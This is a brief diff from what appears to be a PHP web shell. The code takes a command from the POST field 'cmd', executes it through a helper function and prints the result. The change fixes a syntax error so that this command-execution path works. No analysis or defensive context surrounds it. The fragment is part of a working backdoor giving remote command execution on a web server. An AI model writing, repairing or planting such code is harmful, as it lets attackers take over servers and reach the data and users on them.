@@ -36,7 +36,7 @@ function ex($cfe)
 	 return $res;
 }
 
-if($_POST['cmd']!="php_eval"))
+if($_POST['cmd']!="php_eval")
 {
  $cmd_rep = ex($_POST['cmd']);
  echo @htmlspecialchars(convert_cyr_string($cmd_rep,'d','w')); 
